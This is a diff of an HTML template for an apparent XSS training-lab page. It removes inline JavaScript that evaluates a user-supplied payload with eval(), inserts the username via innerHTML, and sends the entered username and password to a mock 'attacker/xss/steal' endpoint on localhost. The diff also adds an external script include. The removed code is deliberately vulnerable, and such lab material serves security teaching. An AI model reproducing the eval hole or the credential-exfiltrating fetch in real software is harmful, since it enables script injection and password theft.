@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>XSS Level 3 Form</title>
     <link rel="stylesheet" href="CSS/style.css">
+    <script src = "JS/script3.js"></script>
 </head>
 <body>
 <header>
@@ -53,37 +54,6 @@
     {% endif %}
 </div>
 
-{% if not show_link %}
-    <script>
-        function submitForm() {
-            const payload = document.getElementById('xss-payload').value;
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
 
-            // Выполняем пейлоад
-            try {
-                if (payload) {
-                    eval(payload); // Опасно, но нужно для XSS
-                }
-            } catch (e) {
-                console.error('Ошибка выполнения пейлоада:', e);
-            }
-
-            // Отображаем приветствие (если данные введены)
-            const greetingDiv = document.getElementById('greeting');
-            if (username) {
-                greetingDiv.innerHTML = 'Привет, ' + username + '!';
-            }
-
-            // Отправляем данные, если они введены
-            if (username && password) {
-                const data = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
-                fetch('http://localhost:8080/attacker/xss/steal?' + data)
-                    .then(response => console.log('Данные отправлены'))
-                    .catch(error => console.error('Ошибка:', error));
-            }
-        }
-    </script>
-{% endif %}
 </body>
 </html>
